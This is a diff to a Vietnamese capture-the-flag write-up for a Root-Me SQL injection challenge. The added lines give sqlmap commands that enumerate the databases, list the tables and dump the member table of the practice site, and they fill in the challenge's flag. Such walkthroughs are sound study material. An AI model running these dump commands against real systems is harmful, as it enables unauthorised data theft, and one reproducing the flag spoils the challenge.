@@ -1,3 +1,4 @@
+
 # SQL injection - String
 CMS v 0.0.2
 
@@ -123,8 +124,21 @@ Truy cập vào từng trang và nhập `'` ở cuối url thì trang `Contents`
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/461a61c0-68eb-4b0f-8c74-3b78b78d2e8d)
 
+Sử dụng sqlmap khai thác với url ta sử dụng `-u`. Gõ lệnh `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs` (`-dbs` là để lấy dữ liệu database).
+
+![Screenshot 2023-11-05 204442](https://github.com/aQ05/Write-up/assets/121664384/9997414a-9c0c-482a-9b7d-391390dd453e)
+
+Có 3 database trả về, tuy nhiên ta chỉ cần chú ý đến database `public` và thực hiện lấy các tables trên db này.
+Gõ lệnh: `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`
+
+(`-D public` là để lấy kết quả trong database public).
+
+![Screenshot 2023-11-05 204559](https://github.com/aQ05/Write-up/assets/121664384/b1aa43ab-37e9-4fe4-9c57-728854912f59)
+
+Ta có 1 bảng là `m3mbr35t4bl3`. Thực hiện lấy data trong bảng. Gõ lệnh: `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`
+![Screenshot 2023-11-05 204707](https://github.com/aQ05/Write-up/assets/121664384/6f2714ff-2dca-4b0a-bd3f-f4fd33b7d4f8)
 
 ## Flag
-
+`1a2BdKT5DIx3qxQN3UaC`
 
 
